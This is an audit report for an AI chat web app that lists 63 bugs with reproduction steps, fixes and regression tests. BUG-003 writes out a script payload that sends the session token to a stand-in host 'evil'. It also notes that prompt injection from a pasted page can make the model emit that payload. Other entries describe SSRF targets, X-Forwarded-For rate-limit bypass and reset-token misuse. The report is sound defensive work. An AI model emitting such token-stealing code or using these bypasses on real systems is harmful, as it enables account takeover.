# Bug fixes: audit of 2026-09-27

Every bug found during the end-to-end audit, with severity, reproduction, expected vs. actual behaviour, the fix, and the automated test that now guards it.

**Severity scale:** **P0** security or data exposure, or a core feature unusable · **P1** a major feature broken, missing or misleading · **P2** a real defect with a workaround or limited blast radius · **P3** minor, cosmetic, or hardening.

**Summary:** 63 issues logged (36 in round 1, 23 in round 2, 4 found while preparing the deploy). Every P0, P1 and P2 is fixed. BUG-024 (P3) is an accepted risk, tracked as KNOWN_ISSUES.md KI-02. BUG-001 is fixed in the tree and in history (purged from every branch on 2026-09-27). Rotating the leaked secrets still needs the owner (SECURITY_ACTIONS.md §4, KI-01).

Every round-2 fix has a test that was run against the old code and failed, then passed with the fix. Round 2 is [below](#round-2-2026-09-27-follow-up).

| ID | Sev | Area | Title | Status | Commit |
|---|---|---|---|---|---|
| BUG-001 | P0 | Security | Archive with `.env` files and a database committed to the repo | Fixed in tree and **purged from history**; owner must rotate secrets ([SECURITY_ACTIONS.md](SECURITY_ACTIONS.md)) | 6e82980 |
| BUG-002 | P1 | Chat | Streaming error leaked provider name, model id and upstream body | Fixed | 901f8c9 |
| BUG-003 | P0 | Code | Preview iframe `allow-scripts allow-same-origin` let generated code read the session token | Fixed | b6766c6 |
| BUG-004 | P1 | Code | "Open in new tab" ran generated code on a same-origin `blob:` URL | Fixed | b6766c6 |
| BUG-005 | P1 | Image gen | Intent detection misrouted 13 of 28 cases (e.g. "draw conclusions", "image carousel component", code workspace) | Fixed | c93687b |
| BUG-006 | P1 | Uploads | Anonymous uploads accepted; every upload's text kept forever in an unused in-memory dict | Fixed | 0be5a5a |
| BUG-007 | P1 | Uploads | PDF/DOCX/XLSX parsed synchronously on the event loop (a big file stalls every request) | Fixed | 0be5a5a |
| BUG-008 | P2 | PDF | Scanned PDF returned empty text silently; the model saw nothing | Fixed | 0be5a5a |
| BUG-009 | P2 | Uploads | Corrupted/password-protected files returned empty text or echoed parser exceptions | Fixed | 0be5a5a |
| BUG-010 | P2 | Uploads | No zip-bomb guard for DOCX/XLSX; no PDF page cap; unbounded sheet iteration | Fixed | 0be5a5a |
| BUG-011 | P1 | Research | Deep research advertised (Business plan) but not implemented | Implemented | e1f387b, 9e38185 |
| BUG-012 | P1 | Voice | Voice mode was a UI stub (mic and "Start Recording" did nothing) | Implemented | 4c97870, 9e38185 |
| BUG-013 | P1 | Code | Multi-file projects previewed unstyled and without scripts | Fixed | b6766c6 |
| BUG-014 | P2 | Code | No way to run JavaScript or Python output ("code execution") | Implemented | b6766c6 |
| BUG-015 | P2 | Search | Search query included inlined attachment text (up to 50k chars) | Fixed | 901f8c9 |
| BUG-016 | P2 | Search | Search silently skipped when the limit was hit or providers failed | Fixed | 901f8c9, 9e38185 |
| BUG-017 | P2 | Search | Snippet enrichment fetched any URL server-side and followed redirects (SSRF) | Fixed | 901f8c9 |
| BUG-018 | P2 | Billing | Daily allowance charged even when chat, image or vision failed | Fixed | c93687b, 0be5a5a |
| BUG-019 | P2 | Image gen | Images in chats older than 7 days broke (expired media token baked into stored URL) | Fixed | c93687b |
| BUG-020 | P3 | Image gen | Regenerate returned the identical image (provider caches by URL) | Fixed | c93687b |
| BUG-021 | P2 | Uploads | Unsupported attachments (zip, pptx, svg…) silently dropped while shown as attached | Fixed | 0be5a5a |
| BUG-022 | P2 | Vision | Free plan "Analyze" showed "[object Object]" instead of the upgrade flow | Fixed | 0be5a5a |
| BUG-023 | P2 | Chat | Retry and Regenerate duplicated the user's message | Fixed | 9e38185 |
| BUG-024 | P3 | Plans | Free users get image understanding through chat attachments (plans list Vision as Pro) | **Accepted risk** (KI-02: at most 100 images per free user per day) | – |
| BUG-025 | P3 | API | API-keys gate returns `403 feature_requires_upgrade` instead of standard `402 upgrade_required` | Fixed (round 2) | b97ae91 |
| BUG-026 | P2 | Chat | No limit on message length or attachment count | Fixed | 901f8c9 |
| BUG-027 | P2 | Uploads | Attachment chips: all files waited for the slowest; same-name files collided; removed files came back | Fixed | 0be5a5a |
| BUG-028 | P3 | Chat | Text attachments sent twice in every request | Fixed | 0be5a5a |
| BUG-029 | P3 | Frontend | `useDebounce` hook was an empty stub | Fixed | b6766c6 |
| BUG-030 | P3 | Privacy | Chat request sent the user's email as `userId` (ignored by the server) | Fixed | 9e38185 |
| BUG-031 | P3 | Chat | SSE parser dropped a final event not followed by a newline | Fixed | 9e38185 |
| BUG-032 | P2 | Uploads | Image data URLs not validated server-side (type, encoding, size, count) | Fixed | 0be5a5a |
| BUG-033 | P2 | Vision | Vision trusted the client's declared content type | Fixed | 0be5a5a |
| BUG-034 | P2 | Chat | HTTP errors rendered as `⚠️ Failed: HTTP 500: {"detail":…}` raw JSON | Fixed | 9e38185 |
| BUG-035 | P3 | Tooling | 9 ESLint errors; no CI at all | Fixed | d74c6bd, 31d7048 |
| BUG-036 | P3 | Tests | Test runs wrote uploads into `Backend/uploads/` | Fixed | 31d7048 |

---

## Details

### BUG-001 · P0 · Archive with `.env` files and a database committed
- **Steps:** `unzip -l vatsaai.com/vatsaai.zip`
- **Expected:** no secrets or user data in the repository.
- **Actual:** the 84 MB archive listed `Backend\.env`, `Backend\vatsa.db`, `Backend\test.db` and `frontend\.env.local`. (Contents were deliberately not opened during the audit.)
- **Fix:** removed the archive plus other stray uploads (`vatsaai-backend-FINAL.zip`, `backend_files.txt`, `Please add`, lint dumps); `*.zip` is now gitignored; CI runs gitleaks on every push and PR. `gitleaks git` over the full history and `gitleaks dir` over the tree found nothing (gitleaks does not look inside zip files, which is why the archive was removed on the listing alone).
- **Owner action still required (cannot be done from a PR):**
  1. Rotate everything those `.env` files could have held: `JWT_SECRET_KEY` (rotating signs everyone out), `OPENROUTER_API_KEY`, SMTP password, OAuth client secrets (Google/GitHub/Microsoft), search API keys, and Razorpay key secret and webhook secret.
  2. Treat the users in `vatsa.db` as exposed (emails, password hashes) and decide on user notification.
  3. ~~Purge history~~ **Done 2026-09-27:** `git filter-repo` removed all three archives (and any `*.env`, `*.db`, `*.sqlite*`, `*.zip`, `*.tar*`, `*.pem`, `*.key` path) from every branch, then force-pushed. `git log --all --full-history -- '*.zip' '*.env' '*.db' '*.sqlite'` is empty in a fresh clone. Still to do: ask GitHub Support to clear cached views of the old SHAs (SECURITY_ACTIONS.md §5).

### BUG-002 · P1 · Provider details leaked in stream errors
- **Steps:** make every model fail (e.g. no OpenRouter credit), send a chat with `stream: true`.
- **Expected:** a generic retryable error.
- **Actual:** `data: {"error": "All AI models failed. Last error: OpenRouter [402]: {\"error\": \"openai/gpt-4o requires credits\"}"}`, which breaks the product's identity rule and exposes infrastructure.
- **Fix:** the stream yields `{"error": "AI service is temporarily unavailable. Please try again.", "code": "ai_unavailable", "retryable": true}`; the detail is logged server-side.
- **Test:** `tests/test_chat.py::test_provider_failure_never_leaks_provider_details[True|False]` (reproduced failing before the fix).

### BUG-003 · P0 · Generated code could steal the session
- **Steps:** in the code workspace, get the model to output `<script>fetch('https://evil/?t='+localStorage.access_token)</script>` (by asking, or via prompt injection from a pasted page).
- **Expected:** generated code is isolated from the app.
- **Actual:** the preview iframe used `srcDoc` with `sandbox="allow-scripts allow-modals allow-same-origin …"`. A srcdoc frame inherits the app's origin, and with both flags the script reads localStorage (the bearer token) and can even remove its own sandbox.
- **Fix:** `PREVIEW_SANDBOX = "allow-scripts allow-modals allow-forms allow-popups"` (no same-origin). Console output reaches the parent only via `postMessage`, accepted solely from that iframe.
- **Tests:** `preview.test.ts › never grants allow-same-origin`; E2E `code-workspace.spec.ts › …inside an isolated sandbox`. There, generated code tries `localStorage.getItem('access_token')` and `parent.document.title` and the console shows `token:blocked|parent-blocked` in real Chromium, desktop and mobile.

### BUG-004 · P1 · "Open in new tab" ran code with the app's origin
- **Actual:** `window.open(URL.createObjectURL(new Blob([html])))`. `blob:` URLs carry the creator's origin, so the same token theft applies in the new tab.
- **Fix:** the tab opens a wrapper page containing no generated code, which frames the preview in the same opaque-origin sandbox (`buildStandalonePage`).
- **Test:** `preview.test.ts › buildStandalonePage frames the preview in the same sandbox`.

### BUG-005 · P1 · Image generation hijacked normal questions
- **Steps / actual** (old detector, run against the shared case list):

  | Message | Old result |
  |---|---|
  | how do I draw conclusions from this data? | generated an image |
  | draw a comparison between Python and Go | image of "comparison between Python and Go" |
  | draw a bar chart of monthly sales in matplotlib | image |
  | make an image carousel component in React | image of "carousel component in React" |
  | create a picture gallery website | image |
  | create an image classifier with PyTorch | image |
  | generate an image processing pipeline | image |
  | explain the image of a function in set theory | image |
  | what paint should I use for a bathroom? | image |
  | what is in this picture of my receipt | image |
  | design a logo for a coffee shop called Bean There | **no** image (false negative) |
  | code workspace: draw a cat using HTML canvas | image instead of code |
  | code workspace: generate an image of a red fox | image instead of code |

- **Expected:** pictures only for picture requests; never in the code workspace or when a file is attached.
- **Fix:** rewritten detector with a technical-word guard, a "draw X" blocklist, workspace and attachment rules, and prompt cleanup that keeps style words ("a realistic photo of…"). The frontend has an exact mirror; both read `shared/image-intent-cases.json`.
- **Tests:** `tests/test_image_generation.py::test_image_intent_*` (28), `imageQuery.test.ts` (29), E2E `image-generation.spec.ts › a non-image request that mentions drawing…`.

### BUG-006 · P1 · Anonymous uploads and a memory leak
- **Steps:** `curl -F file=@big.pdf $API/api/upload` with no token, repeatedly.
- **Actual:** 200 OK; each upload's full text was stored in the module-level `FILE_STORE` dict, which nothing ever read or evicted. Unauthenticated CPU and memory exhaustion.
- **Fix:** `get_current_user` required, `FILE_STORE` deleted, 30 uploads/min/user rate limit, streamed 25 MB cap.
- **Tests:** `test_upload_requires_auth`, `test_in_memory_store_removed`, `test_upload_rate_limited`, `test_oversized_file_rejected`.

### BUG-007 · P1 · Parsing blocked the event loop
- **Actual:** `extract_text_from_bytes` (pdfplumber etc.) ran directly inside `async def upload_file`, so a 200-page PDF froze all concurrent requests, including streaming chats.
- **Fix:** `await run_in_threadpool(extract_text_from_bytes, …)`, plus page and character budgets.
- **Test:** covered functionally by the PDF suite. A concurrency-timing test was judged too flaky for CI; see the manual check in TEST_REPORT.md.

### BUG-008 · P2 · Scanned PDF silently empty
- **Before:** `{"text": ""}`; the chip said "ready"; the message went out with no document content.
- **After:** `{"text": "", "warning": "No selectable text found. This looks like a scanned or image-only PDF…"}`; the chip shows the error.
- **Tests:** `test_scanned_pdf_returns_warning`, E2E `scanned PDF shows the reason…`.

### BUG-009 · P2 · Unreadable files
- **Before:** a corrupted PDF, DOCX or XLSX returned `""` (logged only), or a generic exception came back as `Could not read file: <python exception text>`.
- **After:** 422 with a specific sentence (corrupted / password-protected / not a valid .docx…).
- **Tests:** `test_corrupted_pdf_returns_clear_error`, `test_encrypted_pdf_returns_clear_error`, E2E `password-protected PDF error…`.

### BUG-010 · P2 · Resource exhaustion via documents
- **Fix:** DOCX/XLSX inflated-size check (200 MB), PDF capped at 300 pages, spreadsheet iteration stops at the 50k-character budget; truncation reported as `truncated: true` with `pages`/`pages_parsed`.
- **Tests:** `test_zip_bomb_docx_refused`, `test_large_pdf_is_page_capped_and_flagged`, `test_long_text_truncated_and_flagged`.

### BUG-011 · P1 · Deep research missing
- **Before:** pricing listed "Deep research: Business ✓" and `feature_access.py` had limits for it, but no endpoint or UI existed.
- **After:** `POST /api/research` (plan → parallel search → cited report, streamed with progress) and a **Research** toggle in the composer (Business; others see the upgrade flow).
- **Tests:** `tests/test_deep_research.py` (21), E2E `deep-research.spec.ts` (3 × 2 viewports).

### BUG-012 · P1 · Voice mode missing
- **Before:** mic buttons with no handler; the empty-state popover's "Start Recording" did nothing.
- **After:** dictation with live transcript, Talk mode (auto-send + read reply aloud), per-message Read aloud, clear errors, and a disabled state on unsupported browsers.
- **Tests:** `voice.test.ts` (12), E2E `voice.spec.ts` (6 × 2 viewports).

### BUG-013 · P1 · Multi-file preview broken
- **Before:** blocks were named `file.html`, `file.css`, `file.js`, while the HTML linked `styles.css`/`script.js` (as the system prompt told the model to). Only the HTML reached the srcdoc, so the page rendered unstyled and inert.
- **After:** real file names detected, referenced CSS/JS inlined, unreferenced ones applied, and `$`-sequences and `</script>` handled safely.
- **Tests:** `parsing.test.ts`, `preview.test.ts › inlineAssets…`, E2E asserts `h1` is red and the script ran.

### BUG-014 · P2 · No code execution
- **After:** a lone JS file runs in a console runner; Python runs via Pyodide in the sandbox; console panel with error badge; Run button.
- **Tests:** `preview.test.ts › runs a lone JavaScript file / runs Python…`, E2E `a lone JavaScript file runs…`.

### BUG-015 · P2 · Search query polluted by attachments
- **Before:** `SearchService.search(req.message)`, where the message contains inlined files (`--- File: … ---` + up to 50k chars).
- **After:** `build_search_query` keeps only the user's words, capped at 400 characters.
- **Tests:** `test_build_search_query_*`.

### BUG-016 · P2 · Silent ungrounded answers
- **Before:** when the search limit was hit or providers failed, the chat answered without results and without saying so.
- **After:** a `notice` event/field, shown as a note on the reply.
- **Tests:** `test_search_quota_exhausted_sends_notice_and_still_answers`, `test_search_outage_sends_notice`, E2E `…notice when search was skipped`.

### BUG-017 · P2 · SSRF in snippet enrichment
- **Before:** the server fetched any result URL with `allow_redirects=True`.
- **After:** only public addresses (every resolved IP must be global), no redirects.
- **Tests:** `test_ssrf_guard_blocks_internal_targets` (8 cases incl. 169.254.169.254, ::1, file://).

### BUG-018 · P2 · Charged for failures
- **Before:** `_enforce_daily_limit` / `require_feature` incremented usage before calling the provider.
- **After:** limits are checked first and usage is recorded only after success (chat, code, image, vision, research).
- **Tests:** `test_provider_failure_returns_502_and_keeps_quota`, `test_vision_failure_does_not_use_quota_or_leak`, `test_writer_failure_does_not_leak_or_charge`.

### BUG-019 · P2 · Old images broke
- **Before:** stored markdown contained `…/preview?token=<media token>`, which expires after `ACCESS_TOKEN_EXPIRE_MINUTES` (7 days).
- **After:** `Conversation.to_dict()` re-signs every preview link with a fresh owner token on read.
- **Test:** `test_stored_image_links_are_resigned_on_read`.

### BUG-020 · P3 · Regenerate gave the same picture
- **Fix:** random `seed` per generation (reused across retries of the same attempt).
- **Tests:** `test_each_generation_uses_a_new_seed`, `test_fetch_retries_transient_failures`.

### BUG-021 · P2 · Attachments silently dropped
- **Before:** any non-text file was read as base64 and sent; the server kept only `image/*`, so a `.zip` or `.pptx` looked attached but the model never saw it.
- **After:** the client rejects unsupported types with the list of supported ones; the server returns 400 for non-image base64 attachments.
- **Tests:** `classifyFile`/`validateFile` unit tests, `test_bad_image_attachments_rejected`, E2E `unsupported and empty files are rejected…`.

### BUG-022 · P2 · "[object Object]" on Analyze
- **Before:** `throw new Error(err.detail)`, where `detail` is the gate object.
- **After:** the 402/429 gate opens the upgrade modal; other errors become readable sentences.
- **Test:** E2E `Analyze image on the free plan opens the upgrade flow`.

### BUG-023 · P2 · Duplicate user message on retry/regenerate
- **Before:** Retry appended the question again beneath the failed bubble; Regenerate truncated to the assistant message (keeping the question) and re-sent it, so the question appeared twice.
- **After:** both truncate from the question and send once.
- **Test:** E2E `provider outage shows a friendly error and Try again recovers` (asserts the question appears once).

### BUG-024 · P3 · Accepted risk · Free plan image understanding via chat
Image attachments in chat go to a vision-capable model for every plan, while `/api/vision/analyze` and the plans table treat Vision as Pro. Gating this would remove a capability free users have today. In round 2 it was accepted as a risk with a known bound: 25 messages/day × 4 images = at most 100 image inputs per free user per day. See KNOWN_ISSUES.md KI-02 for how to change it.

### BUG-025 · P3 · Fixed in round 2 · Non-standard API-keys gate
- **Before:** `POST /api/account/api-keys` for Free users returned `403 {"error": "feature_requires_upgrade"}`, while every other gate returns `402 upgrade_required`.
- **After:** `402 {"error":"upgrade_required","feature":"api_keys","current_tier":"free","suggested_tier":"pro","upgrade_url":"/pricing"}`, the same shape the frontend's upgrade flow already parses. The Free UI hides the tab, so no client relied on the 403.
- **Tests:** `test_api_keys_are_a_paid_feature` (the new contract), `test_api_key_authenticates_until_revoked`.

### BUG-026 · P2 · Unbounded chat input
- **Fix:** `message` ≤ 200,000 chars, `attachments` ≤ 10 (422 otherwise).
- **Test:** `test_oversized_message_rejected`.

### BUG-027 · P2 · Attachment chip races
- **Before:** `Promise.all` meant no chip updated until the slowest file finished; placeholders were replaced by filename, so two `notes.txt` collided and a chip removed mid-processing reappeared.
- **After:** each file replaces its own placeholder by id as soon as it's ready.

### BUG-028 · P3 · Text attachments sent twice
The text was inlined into `message` and also sent as `attachments[].content`, which the server ignored. Now only images carry `content`.
- **Test:** E2E `PDF text is extracted and sent inlined with the message` asserts `content` is absent.

### BUG-029 · P3 · `useDebounce` stub
`export function useDebounce() { useEffect(() => {}, []); return {}; }` is now a real debounce (used by the preview).

### BUG-030 · P3 · Email sent as `userId`
Removed along with the unused `userTier` field; identity always comes from the JWT.
- **Test:** E2E `streams a reply` asserts `userId` is absent.

### BUG-031 · P3 · Final SSE event could be lost
The old loop `break`s on `done` without processing the buffered remainder. Replaced by `createSseParser` with `end()`.
- **Test:** `sse.test.ts › handles a final event without a trailing newline`.

### BUG-032 · P2 · Unvalidated image data URLs
Any string (remote URL, SVG, invalid base64, 50 MB) was forwarded to the model provider. Now: PNG/JPEG/WEBP/GIF base64 only, ≤ 8 MB, ≤ 4 per message.
- **Tests:** `test_bad_image_attachments_rejected` (4 cases), `test_oversized_image_attachment_rejected`, `test_too_many_images_rejected`.

### BUG-033 · P2 · Vision trusted the declared type
A script uploaded with `Content-Type: image/png` was base64-encoded and sent to the model (paid call). Now the bytes are verified with Pillow.
- **Test:** `test_vision_rejects_spoofed_content_type`.

### BUG-034 · P2 · Raw JSON errors in chat
- **Before:** `⚠️ Failed: HTTP 500: {"detail":{...}}`.
- **After:** `describeHttpError` / `describeNetworkError` produce sentences (session expired, offline, too large, temporarily unavailable…).
- **Tests:** `sse.test.ts › describeHttpError…`, E2E `HTTP errors never show raw JSON`.

### BUG-035 · P3 · Lint errors, no CI
9 `react-hooks/set-state-in-effect` errors. The four with a clean alternative were fixed properly (`useHydrated`, derived ThinkingBox state, CommandPalette reset during render); four one-time localStorage/initial-fetch effects carry a targeted disable with a reason. `.github/workflows/ci.yml` added.

### BUG-036 · P3 · Test output in the source tree
`tests/conftest.py` didn't set `DATA_DIR`, so upload tests wrote into `Backend/uploads/`. During this audit that output was committed once by mistake (0be5a5a) and removed in 31d7048; conftest now isolates `DATA_DIR` and `Backend/uploads/` is gitignored.

---

## Round 2 (2026-09-27 follow-up)

| ID | Sev | Area | Title | Status | Commit |
|---|---|---|---|---|---|
| BUG-037 | P1 | Security | 2FA TOTP secrets stored in plaintext; backup codes stored as unsalted SHA-256 (a DB copy was already in git history) | Fixed | c7ef6ba |
| BUG-038 | P2 | Privacy | Hard account deletion removed DB rows but left the user's uploads and generated images on disk | Fixed | 9abcdbe |
| BUG-039 | P2 | Security | Two concurrent logins could both redeem the same 2FA backup code | Fixed | ba1d776 |
| BUG-040 | P2 | Legal | Privacy policy claimed uploads are deleted after processing, "train models" opt-outs and AES-256 storage; none true | Fixed (legal review still needed, KI-11) | 6f936f1 |
| BUG-041 | P2 | Security | Per-IP login rate limit trusted the client-controlled first `X-Forwarded-For` entry: rotating fake IPs gave unlimited attempts | Fixed | dbbe8a4 |
| BUG-042 | P3 | Reliability | Rate-limit buckets were never removed: one entry per IP/email ever seen, for the life of the process | Fixed | dbbe8a4 |
| BUG-043 | P3 | Perf | `GET /api/projects` ran 2 extra queries per project (N+1: 42 statements for 20 projects) | Fixed | ee5d1dc |
| BUG-044 | P3 | Code | Python ran from a third-party CDN (jsdelivr); where that host is blocked, Python never started | Fixed (self-hosted) | 3a23fb6 |
| BUG-045 | P3 | UI | Clipboard write failures were unhandled rejections; "Copied" showed even when nothing was copied | Fixed | 36ceb86 |
| BUG-046 | P3 | Mobile | Chat controls under 44×44 px on touch screens; attach/reasoning/settings buttons had no accessible name | Fixed | e2833ad |
| BUG-047 | P3 | Mobile | On-screen keyboard covered the composer; the home indicator overlapped it | Fixed | a18f599 |
| BUG-048 | P3 | Theme | `dark:` styles followed the OS setting instead of the in-app theme; the light-mode user bubble was near-black | Fixed | 3240d1e |
| BUG-049 | P3 | A11y | Serious axe violations on the main screens (contrast, unnamed buttons) | Fixed | 8958a8c |
| BUG-050 | P2 | UI | API errors shown as "[object Object]" (422), "Login failed" (502 HTML), raw codes such as `storage_limit_reached`, and raw backend JSON in the code chat | Fixed | 64d1a6e |
| BUG-051 | P2 | Settings | Revoking an API key happened on one click with no confirmation; create/revoke failures were silently swallowed | Fixed | 9ebaad9 |
| BUG-052 | P3 | UI | Library/Projects/Scheduled showed "Create your first…" next to a load error and while loading; no retry | Fixed | 84b7297 |
| BUG-053 | P3 | A11y | White text on the accent fill was 4.0:1 on every primary button; storage progressbar unnamed | Fixed | 2bba0dc |
| BUG-054 | P3 | Landing | Landing page: 92 (light) / 57 (dark) serious axe violations, cards were role=button wrapping a button, and "Launch Workspace" did nothing | Fixed | 65de7b6 |
| BUG-055 | P3 | Perf | API responses were never compressed (5.4 MB conversation list for a heavy account) | Fixed (gzip, 3.0× smaller) | 7ba0e84 |
| BUG-056 | P3 | Perf | Signed-in visitors to `/` downloaded and rendered the whole landing page before a client redirect | Fixed | 24f9660 |
| BUG-057 | P3 | Perf | 16 landing images below the fold loaded eagerly; 45 had no dimensions | Fixed | 57f603b |
| BUG-058 | P2 | Security | `.gitignore` covered `.env` and `.env.local` only; `.env.production.local` and other variants could be committed | Fixed | cec25b8 |
| BUG-059 | P3 | Tooling | `Backend/.venv/`, created by the README quick start, wasn't gitignored | Fixed | 616adb3 |
| BUG-060 | P1 | Auth | The 10-minute password-reset token was accepted as a full login session by every authenticated route | Fixed | 4accbe8 |
| BUG-061 | P1 | Auth | Every OTP code (sign-up and password reset) was printed with its email to the server log | Fixed | 4accbe8 |
| BUG-062 | P2 | Auth | OTP login for an existing user skipped 2FA, and minted a token without `tv` that no sign-out or password reset could revoke | Fixed | 4accbe8 |
| BUG-063 | P2 | Deploy | `render.yaml` lived in `Backend/`, where Render never reads a Blueprint, and pinned Python 3.14.3 while CI tests 3.11 | Fixed | c167a7e |

### BUG-037 · P1 · 2FA secrets readable from a database copy
- **Steps:** enable 2FA, then read `users.totp_secret` and `users.backup_codes`.
- **Before:** the TOTP seed was stored as-is, so anyone with a DB copy could generate valid codes. Backup codes were `sha256(code)` of 8 hex characters, which a laptop brute-forces from a dump in seconds (2³² guesses).
- **After:** secrets are Fernet-encrypted (`enc:v1:`). The key is `DATA_ENCRYPTION_KEY`, with fallback to a key derived from `JWT_SECRET_KEY` via HKDF; old keys go in `DATA_ENCRYPTION_KEYS_OLD` for rotation. Backup codes are HMAC'd with a server key (`h1:`). Legacy rows keep working and are re-encrypted on the next successful login. An undecryptable secret fails closed. `scripts/reencrypt_two_factor.py` migrates every row (dry run by default, `--apply` to write).
- **Tests:** `test_totp_secret_is_encrypted_at_rest`, `test_backup_codes_are_not_plain_sha256_at_rest`, `test_legacy_plaintext_secret_and_hashes_still_work_and_get_upgraded`, `test_undecryptable_secret_fails_closed`, and the 4 tests in `test_crypto_rotation.py`.

### BUG-038 · P2 · Deleted accounts left files behind
- **Before:** hard deletion removed the DB rows only; the user's upload and generated-image directories stayed on disk.
- **After:** `_delete_user_files(uid)` removes them after the DB commit. Each path is checked to be inside its storage root before removal.
- **Test:** `test_hard_delete_removes_uploads_and_generated_images`.

### BUG-039 · P2 · Backup-code replay race
- **Before:** read the codes → remove the used one → commit. Two logins that both read before either committed each got a session from one code.
- **After:** a compare-and-swap `UPDATE … WHERE backup_codes = <what was read>`, followed by a rowcount check; exactly one request wins.
- **Test:** `test_backup_code_cannot_be_used_twice_concurrently` (two real DB sessions both read the codes before either writes; exactly one may succeed).

### BUG-040 · P2 · Privacy policy contradicted the code
Uploads are kept in the Library and sent to the AI provider. Nothing trains models. There is no application-level AES-256 encryption. The policy now says exactly that and lists the processors: AI model providers, image generation, web search, browser speech services, Google/GitHub sign-in and Razorpay.
- **Test:** E2E `privacy policy matches how data is really handled`.

### BUG-041 / BUG-042 · Rate-limit bypass and unbounded buckets
- **Steps (041):** 12 failed logins, each with a different `X-Forwarded-For: 1.2.3.<n>`.
- **Before:** no 429. `client_ip` used the first header entry, which the client writes.
- **After:** the Nth entry from the right, where N = `TRUSTED_PROXY_COUNT` (default 1 for Render). With 0 the header is ignored. Buckets store their own window and expired ones are pruned every 1,000 calls.
- **Tests:** 7 in `test_rate_limit.py`, including `test_login_ip_limit_holds_against_rotating_fake_ips` and `test_expired_buckets_are_pruned`.

### BUG-043 · P3 · Projects list N+1
`to_public_dicts` loads every project's chat and file ids in 2 queries in total. `test_list_endpoints_have_no_n_plus_1` counts SQL statements at 2 vs 20 rows for 5 list endpoints; projects failed before the fix (6 vs 42 statements). `test_hot_query_uses_an_index` checks `EXPLAIN QUERY PLAN` for 15 hot queries.

### BUG-044 · P3 · Python depended on a CDN
Pyodide 0.29.5 is now an exact npm dependency, copied to `public/pyodide/` by `predev`/`prebuild` and served from the app's own origin (CORS headers in `next.config.ts` and `netlify.toml`). A missing package now reads "Package 'X' isn't available … standard library only" instead of a traceback.
- **Tests:** E2E Python primes and numpy-missing cases. This sandbox blocks jsdelivr, so these real Python runs are possible only with the self-hosted runtime.

### BUG-045 · P3 · Clipboard failures
- **Tests:** E2E `copying a code block puts the code on the clipboard`, `when the clipboard is blocked…` (shows "Copy failed").

### BUG-046 / BUG-047 · Touch targets and keyboard
A `tap-target` utility enforces 44×44 px on coarse pointers. Every icon button has a name. The viewport meta sets `interactive-widget=resizes-content` and `viewport-fit=cover`, the shells use `h-dvh`, and the composer pads for `safe-area-inset-bottom`.
- **Tests:** E2E `every chat control is at least 44x44 and has an accessible name`, `keyboard and notch aware…`, `no page scrolls sideways` (Pixel 7 profile).

### BUG-048 · P3 · `dark:` followed the OS
Tailwind v4's default `dark:` is `prefers-color-scheme`, while the app toggles a `.dark` class. Choosing Light on a dark OS therefore mixed themes. Fixed with `@custom-variant dark (&:where(.dark, .dark *))`.
- **Tests:** E2E `dark: styles follow the in-app theme (light|dark), not the OS (dark|light)`.

### BUG-049 / BUG-053 · Contrast and names on the app screens
Gray text pairs, footer links and red error text were adjusted to ≥ 4.5:1. `IconBtn` passes its tooltip as the accessible name. Primary buttons with white text use a solid `#9333ea` fill (5.4:1 instead of 4.0:1); accent-coloured text keeps `#a855f7`, which passes on dark backgrounds. The Library storage bar is named.
- **Test:** E2E axe scan (WCAG 2.1 A/AA, serious and critical fail the test) over `/`, `/pricing`, `/privacy`, `/login`, `/code`, `/library`, `/projects`, `/scheduled`, `/home` and a conversation, in light and dark themes.

### BUG-050 · P2 · Unreadable API errors
- **Before:** a FastAPI 422 on login showed "[object Object]"; a proxy's 502 HTML page showed "Login failed"; library calls threw `storage_limit_reached`; the code chat pasted unrecognised backend JSON into the conversation.
- **After:** one tested `describeApiError(body, status, fallback)` handles string details (≤ 300 chars), plan/limit codes, validation arrays (`email: value is not a valid email address`), HTML and oversized bodies, and status fallbacks. `parseOrThrow`, auth, chat, checkout and the three login stores all use it. The stores no longer throw a `SyntaxError` on non-JSON bodies. The auth error box has `role="alert"`.
- **Tests:** `errors.test.ts` (6), E2E `validation errors are summarised…`, `a proxy's HTML error page becomes a plain sentence`, `the server's own message is shown as-is`.

### BUG-051 · P2 · API key revoke without confirmation
Revoking breaks every integration that uses the key, but it fired on one click of a trash icon. It now needs an explicit "Revoke key" in an inline confirmation that says "Apps using it stop working". Create and revoke failures appear in a `role="alert"` message.
- **Tests:** E2E `revoking a key needs a second, explicit click` (asserts no DELETE after Cancel), `create and revoke failures are shown, not swallowed` (before: an unhandled rejection with nothing on screen).

### BUG-052 · P3 · False empty states
A shared `ListStatus` shows a `role="status"` spinner while an empty list loads, and a `role="alert"` error with a working "Try again". The empty state appears only when the list really is empty.
- **Tests:** E2E `list-states.spec.ts`: 6 cases across Library, Projects and Scheduled (all 6 failed before).

### BUG-054 · P3 · Landing page
The round-1 axe result for `/` was really `/home`: the test browser was signed in, so `/` redirected. Scanning `/` signed out (`gotoSignedOut`) found the real problems:
- `text-neutral-500/600` at 2.4–4.2:1 on near-black;
- no page background of its own (only a fixed decorative layer);
- workspace cards were `role="button"` wrapping a Launch button;
- "Launch Workspace" only called `stopPropagation()`, so it did nothing.

Cards are now labelled groups with a real toggle button, and Launch starts that workspace.
- **Tests:** E2E axe scan of `/` (light and dark), `workspace cards flip from the keyboard and Launch goes somewhere`.

### BUG-055 / BUG-056 / BUG-057 · Performance
See TEST_REPORT.md §6 for the before/after numbers.
- **Tests:** `test_json_responses_are_gzipped`, `test_chat_stream_is_not_compressed` (SSE must stay uncompressed), E2E `server redirects / to /home when a session cookie is present`, `signed-out visitors still get the landing page`.

### BUG-058 · P2 · `.env` variants not ignored
`.env.*` is now ignored, except `.env.example` files and the public `frontend/.env.production`. The pre-commit hook and CI (`forbidden_files.py`) also reject any secret-bearing file, whatever `.gitignore` says.
- **Tests:** `tools/security/test_security_tools.py` (30 cases, including env-file detection); `git check-ignore` was verified by hand.

### BUG-059 · P3 · Virtualenv not ignored
Found by running the README on a clean clone (TEST_REPORT.md §8): afterwards, `git status` listed `Backend/.venv/`. `.venv/` and `venv/` are now ignored, confirmed with `git check-ignore` (not ignored before, ignored after).

### BUG-060 / BUG-061 / BUG-062 · Auth: reset tokens, logged OTPs, OTP login
Found while verifying the password-reset flow for the leaked-database force reset.
- **060, before:** `get_current_user` rejected tokens with a `scope` claim, but not the reset token's `purpose` claim. So the token from `/auth/otp/verify` worked as a full session for 10 minutes, e.g. `GET /auth/me` returned 200.
- **061, before:** `POST /auth/otp/send` ran `print(f"[OTP] Generated for {email}: {code}")` before sending. Anyone who could read the server log could reset any account.
- **062, before:** verifying a sign-up OTP for an existing email returned a session with no 2FA step, and without the `tv` claim. That session survived password resets, "sign out other devices" and the force-reset command.
